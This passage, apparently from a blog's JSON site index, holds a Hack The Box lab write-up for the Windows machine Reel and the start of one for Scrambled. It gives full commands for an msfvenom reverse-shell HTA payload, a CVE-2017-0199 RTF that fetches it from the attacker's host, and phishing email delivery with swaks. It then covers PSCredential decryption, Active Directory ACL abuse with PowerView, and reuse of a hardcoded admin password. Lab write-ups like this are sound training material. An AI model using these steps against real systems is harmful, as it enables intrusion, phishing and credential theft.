SF:\\n\u0026#34;)%r(GetRequest,54,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n503\\x20Bad\\x20 SF:sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\ SF:r\\n\u0026#34;)%r(HTTPOptions,54,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n503\\x20Bad\\x SF:20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20command SF:s\\r\\n\u0026#34;)%r(RTSPRequest,54,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n503\\x20Bad SF:\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20comma SF:nds\\r\\n\u0026#34;)%r(RPCCheck,18,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n\u0026#34;)%r(DNSVer SF:sionBindReqTCP,18,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n\u0026#34;)%r(DNSStatusReq SF:uestTCP,18,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n\u0026#34;)%r(SSLSessionReq,18,\u0026#34;2 SF:20\\x20Mail\\x20Service\\x20ready\\r\\n\u0026#34;)%r(TerminalServerCookie,36,\u0026#34;220\\x20 SF:Mail\\x20Service\\x20ready\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\ SF:n\u0026#34;)%r(TLSSessionReq,18,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n\u0026#34;)%r(Kerbero SF:s,18,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n\u0026#34;)%r(SMBProgNeg,18,\u0026#34;220\\x20Mai SF:l\\x20Service\\x20ready\\r\\n\u0026#34;)%r(X11Probe,18,\u0026#34;220\\x20Mail\\x20Service\\x20re SF:ady\\r\\n\u0026#34;)%r(FourOhFourRequest,54,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n50 SF:3\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\ SF:x20commands\\r\\n\u0026#34;)%r(LPDString,18,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n\u0026#34;) SF:%r(LDAPSearchReq,18,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n\u0026#34;)%r(LDAPBindRe SF:q,18,\u0026#34;220\\x20Mail\\x20Service\\x20ready\\r\\n\u0026#34;)%r(SIPOptions,162,\u0026#34;220\\x20Ma SF:il\\x20Service\\x20ready\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n5 SF:03\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of SF:\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\ SF:x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20comman SF:ds\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequenc SF:e\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\ SF:x20Bad\\x20sequence\\x20of\\x20commands\\r\\n503\\x20Bad\\x20sequence\\x20of\\x2 SF:0commands\\r\\n\u0026#34;); Service Info: Host: REEL; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb-os-discovery: | OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3) | OS CPE: cpe:/o:microsoft:windows_server_2012::- | Computer name: REEL | NetBIOS computer name: REEL\\x00 | Domain name: HTB.LOCAL | Forest name: HTB.LOCAL | FQDN: REEL.HTB.LOCAL |_ System time: 2023-09-13T18:45:17+01:00 | smb2-time: | date: 2023-09-13T17:45:18 |_ start_date: 2023-09-13T17:37:37 | smb2-security-mode: | 3:0:2: |_ Message signing enabled and required |_clock-skew: mean: -20m36s, deviation: 34m36s, median: -38s Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 212.37 seconds smb └─$ smbclient -N -L //10.10.10.77 Anonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.77 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available ftp └─$ ftp anonymous@10.10.10.77 Connected to 10.10.10.77. 220 Microsoft FTP Service 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||41001|) 125 Data connection already open; Transfer starting. 05-29-18 12:19AM \u0026lt;DIR\u0026gt; documents 226 Transfer complete. ftp\u0026gt; cd Documents 250 CWD command successful. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||41002|) 125 Data connection already open; Transfer starting. 05-29-18 12:19AM 2047 AppLocker.docx 05-28-18 02:01PM 124 readme.txt 10-31-17 10:13PM 14581 Windows Event Forwarding.docx ftp\u0026gt; prompt Interactive mode off. ftp\u0026gt; mget * ... └─$ cat readme.txt please email me any rtf format procedures - I\u0026#39;ll review and convert. new format / converted documents will be saved here. └─$ exiftool *.docx ======== AppLocker.docx ExifTool Version Number : 12.64 File Name : AppLocker.docx Directory : . File Size : 2.0 kB File Modification Date/Time : 2018:05:29 00:19:48+01:00 File Access Date/Time : 2023:09:13 18:49:30+01:00 File Inode Change Date/Time : 2023:09:13 18:49:30+01:00 File Permissions : -rw-r--r-- File Type : DOCX File Type Extension : docx MIME Type : application/vnd.openxmlformats-officedocument.wordprocessingml.document Zip Required Version : 20 Zip Bit Flag : 0x0008 Zip Compression : Deflated Zip Modify Date : 2018:05:29 00:19:50 Zip CRC : 0x3cdd8b4f Zip Compressed Size : 166 Zip Uncompressed Size : 284 Zip File Name : _rels/.rels ======== Windows Event Forwarding.docx ExifTool Version Number : 12.64 File Name : Windows Event Forwarding.docx Directory : . File Size : 15 kB File Modification Date/Time : 2017:10:31 21:13:23+00:00 File Access Date/Time : 2023:09:13 18:49:32+01:00 File Inode Change Date/Time : 2023:09:13 18:49:32+01:00 File Permissions : -rw-r--r-- File Type : DOCX File Type Extension : docx MIME Type : application/vnd.openxmlformats-officedocument.wordprocessingml.document Zip Required Version : 20 Zip Bit Flag : 0x0006 Zip Compression : Deflated Zip Modify Date : 1980:01:01 00:00:00 Zip CRC : 0x82872409 Zip Compressed Size : 385 Zip Uncompressed Size : 1422 Zip File Name : [Content_Types].xml Creator : nico@megabank.com Revision Number : 4 Create Date : 2017:10:31 18:42:00Z Modify Date : 2017:10:31 18:51:00Z Template : Normal.dotm Total Edit Time : 5 minutes Pages : 2 Words : 299 Characters : 1709 Application : Microsoft Office Word Doc Security : None Lines : 14 Paragraphs : 4 Scale Crop : No Heading Pairs : Title, 1 Titles Of Parts : Company : Links Up To Date : No Characters With Spaces : 2004 Shared Doc : No Hyperlinks Changed : No App Version : 14.0000 2 image files read smtp We can do it via nmap Or smtp-user-enum └─$ nmap -Pn --script smtp-enum* -p25 10.10.10.77 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 18:51 BST Nmap scan report for 10.10.10.77 (10.10.10.77) Host is up (0.092s latency). PORT STATE SERVICE 25/tcp open smtp | smtp-enum-users: | root | admin | administrator | webadmin | sysadmin | netadmin | guest | user | web |_ test Foothold We saw a note with stating that we can send email any rtf format procedures which will be reviewed https://nvd.nist.gov/vuln/detail/CVE-2017-0199 PoC or Github onehttps://github.com/bhdresh/CVE-2017-0199 We have to generate a malicious RTF file So when opened in vulnerable versions of Microsoft Word it will lead to code execution. The flaw exists in how a olelink object makes a http(s) request, and execute hta code in response. Let\u0026rsquo;s generate hta file msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.9 LPORT=6666 -f hta-psh -o payload.hta └─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.9 LPORT=6666 -f hta-psh -o payload.hta [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Final size of hta-psh file: 7385 bytes Saved as: payload.hta Now we need RTF file └─$ python2.7 cve-2017-0199_toolkit.py -M gen -w document.rtf -u http://10.10.16.9/payload.hta -t rtf -x 0 Generating normal RTF payload. Generated document.rtf successfully Let\u0026rsquo;s send email swaks --to nico@megabank.com --from pentest@megabank.com --header \u0026quot;Subject: Document Review\u0026quot; --body 'Sending the document for review before sending it to the clients.' --server 10.10.10.77 --attach document.rtf After few minutes, we have a connection User #1 whoami C:\\Windows\\system32\u0026gt;whoami whoami htb\\nico C:\\Windows\\system32\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ============================== ======== SeShutdownPrivilege Shut down the system Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled C:\\Windows\\system32\u0026gt;whoami /groups whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ========================================== ================ ============================================== ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Performance Monitor Users Alias S-1-5-32-558 Mandatory group, Enabled by default, Enabled group BUILTIN\\Print Operators Alias S-1-5-32-550 Group used for deny only BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Pre-Windows 2000 Compatible Access Alias S-1-5-32-554 Group used for deny only NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group HTB\\AppLocker_Test Group S-1-5-21-2648318136-3688571242-2924127574-1138 Mandatory group, Enabled by default, Enabled group HTB\\MegaBank_Users Group S-1-5-21-2648318136-3688571242-2924127574-1604 Mandatory group, Enabled by default, Enabled group HTB\\DR_Site Group S-1-5-21-2648318136-3688571242-2924127574-1143 Mandatory group, Enabled by default, Enabled group HTB\\HelpDesk_Admins Group S-1-5-21-2648318136-3688571242-2924127574-1145 Mandatory group, Enabled by default, Enabled group HTB\\Restrictions Group S-1-5-21-2648318136-3688571242-2924127574-1146 Mandatory group, Enabled by default, Enabled group Authentication authority asserted identity Well-known group S-1-18-1 Mandatory group, Enabled by default, Enabled group Mandatory Label\\Medium Mandatory Level Label S-1-16-8192 We have a cred.xml file in Desktop c:\\Users\\nico\u0026gt;dir Desktop dir Desktop Volume in drive C has no label. Volume Serial Number is CEBA-B613 Directory of c:\\Users\\nico\\Desktop 28/05/2018 21:07 \u0026lt;DIR\u0026gt; . 28/05/2018 21:07 \u0026lt;DIR\u0026gt; .. 28/10/2017 00:59 1,468 cred.xml 14/09/2023 17:05 34 user.txt 2 File(s) 1,502 bytes 2 Dir(s) 4,980,654,080 bytes free c:\\Users\\nico\u0026gt;type desktop\\cred.xml type desktop\\cred.xml \u0026lt;Objs Version=\u0026#34;1.1.0.1\u0026#34; xmlns=\u0026#34;http://schemas.microsoft.com/powershell/2004/04\u0026#34;\u0026gt; \u0026lt;Obj RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;TN RefId=\u0026#34;0\u0026#34;\u0026gt; \u0026lt;T\u0026gt;System.Management.Automation.PSCredential\u0026lt;/T\u0026gt; \u0026lt;T\u0026gt;System.Object\u0026lt;/T\u0026gt; \u0026lt;/TN\u0026gt; \u0026lt;ToString\u0026gt;System.Management.Automation.PSCredential\u0026lt;/ToString\u0026gt; \u0026lt;Props\u0026gt; \u0026lt;S N=\u0026#34;UserName\u0026#34;\u0026gt;HTB\\Tom\u0026lt;/S\u0026gt; \u0026lt;SS N=\u0026#34;Password\u0026#34;\u0026gt;01000000d08c9ddf0115d1118c7a00c04fc297eb01000000e4a07bc7aaeade47925c42c8be5870730000000002000000000003660000c000000010000000d792a6f34a55235c22da98b0c041ce7b0000000004800000a00000001000000065d20f0b4ba5367e53498f0209a3319420000000d4769a161c2794e19fcefff3e9c763bb3a8790deebf51fc51062843b5d52e40214000000ac62dab09371dc4dbfd763fea92b9d5444748692\u0026lt;/SS\u0026gt; \u0026lt;/Props\u0026gt; \u0026lt;/Obj\u0026gt; \u0026lt;/Objs\u0026gt; It\u0026rsquo;s PSCredential and we can read it using Import-CliXml https://book.hacktricks.xyz/windows-hardening/basic-powershell-for-pentesters#secure-string-to-plaintext PS c:\\Users\\nico\u0026gt; $cred = Import-CliXml -Path cred.xml; $cred.GetNetworkCredential() | Format-List * UserName : Tom Password : 1ts-mag1c!!! SecurePassword : System.Security.SecureString Domain : HTB Let\u0026rsquo;s try ssh to box using the new creds └─$ ssh tom@10.10.10.77 tom@10.10.10.77\u0026#39;s password: Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. tom@REEL C:\\Users\\tom\u0026gt; User #2 tom\u0026rsquo;s desktop contains AD Audit folder with a note tom@REEL C:\\Users\\tom\\Desktop\\AD Audit\u0026gt;dir Volume in drive C has no label. Volume Serial Number is CEBA-B613 Directory of C:\\Users\\tom\\Desktop\\AD Audit 05/29/2018 09:02 PM \u0026lt;DIR\u0026gt; . 05/29/2018 09:02 PM \u0026lt;DIR\u0026gt; .. 05/30/2018 12:44 AM \u0026lt;DIR\u0026gt; BloodHound 05/29/2018 09:02 PM 182 note.txt 1 File(s) 182 bytes 3 Dir(s) 4,979,994,624 bytes free tom@REEL C:\\Users\\tom\\Desktop\\AD Audit\u0026gt;type note.txt Findings: Surprisingly no AD attack paths from user to Domain Admin (using default shortest path query). Maybe we should re-run Cypher query against other groups we\u0026#39;ve created. tom@REEL C:\\Users\\tom\\Desktop\\AD Audit\u0026gt; We also have AD audit tools And acls.csv file tom@REEL C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound\u0026gt;dir Volume in drive C has no label. Volume Serial Number is CEBA-B613 Directory of C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound 05/30/2018 12:44 AM \u0026lt;DIR\u0026gt; . 05/30/2018 12:44 AM \u0026lt;DIR\u0026gt; .. 05/29/2018 08:57 PM \u0026lt;DIR\u0026gt; Ingestors 10/30/2017 11:15 PM 769,587 PowerView.ps1 1 File(s) 769,587 bytes 3 Dir(s) 4,979,994,624 bytes free tom@REEL C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound\u0026gt;dir Ingestors Volume in drive C has no label. Volume Serial Number is CEBA-B613 Directory of C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound\\Ingestors 05/29/2018 08:57 PM \u0026lt;DIR\u0026gt; . 05/29/2018 08:57 PM \u0026lt;DIR\u0026gt; .. 11/17/2017 12:50 AM 112,225 acls.csv 10/28/2017 09:50 PM 3,549 BloodHound.bin 10/24/2017 04:27 PM 246,489 BloodHound_Old.ps1 10/24/2017 04:27 PM 568,832 SharpHound.exe 10/24/2017 04:27 PM 636,959 SharpHound.ps1 5 File(s) 1,568,054 bytes 2 Dir(s) 4,979,994,624 bytes free We can\u0026rsquo;t run Sharphound tom@REEL C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound\\Ingestors\u0026gt;.\\SharpHound.exe -c All This program is blocked by group policy. For more information, contact your system administrator. So let\u0026rsquo;s download the acls.csv tom@REEL C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound\\Ingestors\u0026gt;copy acls.csv \\\\10.10.16.9\\share 1 file(s) copied. tom has WriteOwner over claire claire has WriteDacl over Backup_Admins So let\u0026rsquo;s get claire https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writeowner Let\u0026rsquo;s change the owner claire and then reset her password PS C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound\u0026gt; import-module .\\Powerview.ps1 PS C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound\u0026gt; Set-DomainObjectOwner -identity claire -OwnerIdentity tom PS C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound\u0026gt; Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword PS C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound\u0026gt; $cred = ConvertTo-SecureString \u0026#34;P@ssw0rd!\u0026#34; -AsPlainText -force PS C:\\Users\\tom\\Desktop\\AD Audit\\BloodHound\u0026gt; Set-DomainUserPassword -identity claire -accountpassword $cred └─$ ssh claire@10.10.10.77 claire@10.10.10.77\u0026#39;s password: Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. claire@REEL C:\\Users\\claire\u0026gt; User #3 Now as a claire we can add ourselves to Backup_Admins group due to WriteDacl https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#writedacl Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. claire@REEL C:\\Users\\claire\u0026gt;net group backup_admins Group name Backup_Admins Comment Members ------------------------------------------------------------------------------- ranj The command completed successfully. claire@REEL C:\\Users\\claire\u0026gt;net group backup_admins claire /add The command completed successfully. claire@REEL C:\\Users\\claire\u0026gt;net group backup_admins Group name Backup_Admins Comment Members ------------------------------------------------------------------------------- claire ranj The command completed successfully. claire@REEL C:\\Users\\claire\u0026gt; Root Permissions over Administrator folder claire@REEL c:\\Users\u0026gt;icacls Administrator Administrator NT AUTHORITY\\SYSTEM:(OI)(CI)(F) HTB\\Backup_Admins:(OI)(CI)(F) HTB\\Administrator:(OI)(CI)(F) BUILTIN\\Administrators:(OI)(CI)(F) Successfully processed 1 files; Failed processing 0 files But we can\u0026rsquo;t read the flag claire@REEL c:\\Users\\Administrator\u0026gt;dir Desktop Volume in drive C has no label. Volume Serial Number is CEBA-B613 Directory of c:\\Users\\Administrator\\Desktop 01/21/2018 03:56 PM \u0026lt;DIR\u0026gt; . 01/21/2018 03:56 PM \u0026lt;DIR\u0026gt; .. 11/02/2017 10:47 PM \u0026lt;DIR\u0026gt; Backup Scripts 09/14/2023 05:05 PM 34 root.txt 1 File(s) 34 bytes 3 Dir(s) 4,978,888,704 bytes free claire@REEL c:\\Users\\Administrator\u0026gt;type Desktop\\root.txt Access is denied. Content of Backup Scripts folder claire@REEL c:\\Users\\Administrator\\Desktop\\Backup Scripts\u0026gt;dir Volume in drive C has no label. Volume Serial Number is CEBA-B613 Directory of c:\\Users\\Administrator\\Desktop\\Backup Scripts 11/02/2017 10:47 PM \u0026lt;DIR\u0026gt; . 11/02/2017 10:47 PM \u0026lt;DIR\u0026gt; .. 11/04/2017 12:22 AM 845 backup.ps1 11/02/2017 10:37 PM 462 backup1.ps1 11/04/2017 12:21 AM 5,642 BackupScript.ps1 11/02/2017 10:43 PM 2,791 BackupScript.zip 11/04/2017 12:22 AM 1,855 folders-system-state.txt 11/04/2017 12:22 AM 308 test2.ps1.txt 6 File(s) 11,903 bytes 2 Dir(s) 4,978,888,704 bytes free We have creds in one of the scripts claire@REEL c:\\Users\\Administrator\\Desktop\\Backup Scripts\u0026gt;type BackupScript.ps1 # admin password $password=\u0026#34;Cr4ckMeIfYouC4n!\u0026#34; #Variables, only Change here $Destination=\u0026#34;\\\\BACKUP03\\BACKUP\u0026#34; #Copy the Files to this Location $Versions=\u0026#34;50\u0026#34; #How many of the last Backups you want to keep $BackupDirs=\u0026#34;C:\\Program Files\\Microsoft\\Exchange Server\u0026#34; #What Folders you want to backup $Log=\u0026#34;Log.txt\u0026#34; #Log Name $LoggingLevel=\u0026#34;1\u0026#34; #LoggingLevel only for Output in Powershell Window, 1=smart, 3=Heavy #STOP-no changes from here #STOP-no changes from here #Settings - do not change anything from here $Backupdir=$Destination +\u0026#34;\\Backup-\u0026#34;+ (Get-Date -format yyyy-MM-dd)+\u0026#34;-\u0026#34;+(Get-Random -Maximum 100000)+\u0026#34;\\\u0026#34; $Items=0 $Count=0 $ErrorCount=0 $StartDate=Get-Date #-format dd.MM.yyyy-HH:mm:ss ... Let\u0026rsquo;s ssh Administrator:Cr4ckMeIfYouC4n! └─$ ssh administrator@10.10.10.77 administrator@10.10.10.77\u0026#39;s password: Microsoft Windows [Version 6.3.9600] (c) 2013 Microsoft Corporation. All rights reserved. administrator@REEL C:\\Users\\Administrator\u0026gt; ","date":"September 11, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/reel/images/reel.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/reel/","summary":"Reel Enumeration nmap └─$ nmap -Pn -p- 10.10.10.77 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-13 18:39 BST Nmap scan report for 10.10.10.77 (10.10.10.77) Host is up (0.093s latency). Not shown: 65527 filtered tcp ports (no-response) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 25/tcp open smtp 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 593/tcp open http-rpc-epmap 49159/tcp open unknown └─$ nmap -Pn -p21,22,25,135,139,445,593 -sC -sV 10.","tags":["HTB","ftp","cve-2017-0199","rtf","hta","phishing","ssh","bloodhound","powerview","active-directory","writeowner"],"title":"[HTB] Machine: Reel"},{"categories":null,"contents":"Scrambled Enumeration nmap └─$ nmap -Pn -p- 10.10.11.168 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 16:42 BST Nmap scan report for 10.10.11.168 (10.10.11.168) Host is up (0.092s latency). Not shown: 65516 filtered tcp ports (no-response) PORT STATE SERVICE 53/tcp open domain 80/tcp open http 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 1433/tcp open ms-sql-s 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 5985/tcp open wsman 9389/tcp open adws 49668/tcp open unknown 49673/tcp open unknown 49674/tcp open unknown 49697/tcp open unknown 49701/tcp open unknown └─$ nmap -Pn -p53,80,88,135,139,389,445,464,593,636,1433,4411,5985,9389 -sC -sV 10.10.11.168 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-12 16:53 BST Nmap scan report for 10.10.11.168 (10.10.11.168) Host is up (0.17s latency). Bug in ms-sql-ntlm-info: no string output. PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Scramble Corp Intranet | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-09-12 15:53:28Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) |_ssl-date: 2023-09-12T15:56:40+00:00; -37s from scanner time. | ssl-cert: Subject: commonName=DC1.scrm.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC1.scrm.local | Not valid before: 2022-06-09T15:30:57 |_Not valid after: 2023-06-09T15:30:57 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC1.scrm.local | Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::\u0026lt;unsupported\u0026gt;, DNS:DC1.scrm.local | Not valid before: 2022-06-09T15:30:57 |_Not valid after: 2023-06-09T15:30:57 |_ssl-date: 2023-09-12T15:56:40+00:00; -37s from scanner time. 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM | ms-sql-info: | 10.10.11.168:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_ssl-date: 2023-09-12T15:56:40+00:00; -37s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-09-12T15:09:29 |_Not valid after: 2053-09-12T15:09:29 4411/tcp open found? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: | SCRAMBLECORP_ORDERS_V1.0.3; | FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: | SCRAMBLECORP_ORDERS_V1.0.3; |_ ERROR_UNKNOWN_COMMAND; 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4411-TCP:V=7.94%I=7%D=9/12%Time=6500899D%P=x86_64-pc-linux-gnu%r(NU SF:LL,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(GenericLines,1D,\u0026#34;SCRAMBLEC SF:ORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(GetRequest,35,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\. SF:3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\u0026#34;)%r(HTTPOptions,35,\u0026#34;SCRAMBLECORP_ORDER SF:S_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\u0026#34;)%r(RTSPRequest,35,\u0026#34;SCRAMBLEC SF:ORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\u0026#34;)%r(RPCCheck,1D,\u0026#34;SCR SF:AMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(DNSVersionBindReqTCP,1D,\u0026#34;SCRAMBLECOR SF:P_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(DNSStatusRequestTCP,1D,\u0026#34;SCRAMBLECORP_ORDERS_ SF:V1\\.0\\.3;\\r\\n\u0026#34;)%r(Help,35,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNO SF:WN_COMMAND;\\r\\n\u0026#34;)%r(SSLSessionReq,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n SF:\u0026#34;)%r(TerminalServerCookie,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(TLS SF:SessionReq,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(Kerberos,1D,\u0026#34;SCRAM SF:BLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(SMBProgNeg,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\ SF:.0\\.3;\\r\\n\u0026#34;)%r(X11Probe,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(FourO SF:hFourRequest,35,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND SF:;\\r\\n\u0026#34;)%r(LPDString,35,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_ SF:COMMAND;\\r\\n\u0026#34;)%r(LDAPSearchReq,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)% SF:r(LDAPBindReq,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(SIPOptions,35,\u0026#34; SF:SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\u0026#34;)%r(LANDesk SF:-RC,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(TerminalServer,1D,\u0026#34;SCRAMB SF:LECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(NCP,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r SF:\\n\u0026#34;)%r(NotesRPC,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(JavaRMI,1D,\u0026#34;S SF:CRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(WMSRequest,1D,\u0026#34;SCRAMBLECORP_ORDERS SF:_V1\\.0\\.3;\\r\\n\u0026#34;)%r(oracle-tns,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r SF:(ms-sql-s,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(afp,1D,\u0026#34;SCRAMBLECOR SF:P_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(giop,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;); Service Info: 